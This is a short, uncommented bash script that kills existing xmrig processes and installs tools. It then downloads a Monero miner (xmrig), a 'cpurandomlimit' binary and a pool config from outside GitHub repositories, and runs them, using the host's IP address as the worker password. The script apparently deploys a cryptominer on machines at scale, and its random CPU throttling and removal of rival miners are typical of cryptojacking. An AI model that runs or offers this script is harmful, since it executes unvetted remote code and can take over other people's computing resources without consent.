#!/bin/bash
killall xmrig
killall cpulimit
PASS=`ip route get 1 | awk -F 'src ' '{print $2}' | awk '{print $1}'| sed 's/\./-/g'`
apt install wget cpulimit screen psmisc -y
wget https://raw.githubusercontent.com/mzcof/c3/main/cpurandomlimit
chmod +x ./cpurandomlimit
wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar -xvf ./xmrig.tar.gz
chmod +x ./xmrig
rm ./config.json
wget https://raw.githubusercontent.com/mzcof/c3/main/c5a2/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
./xmrig
screen ./cpurandomlimit
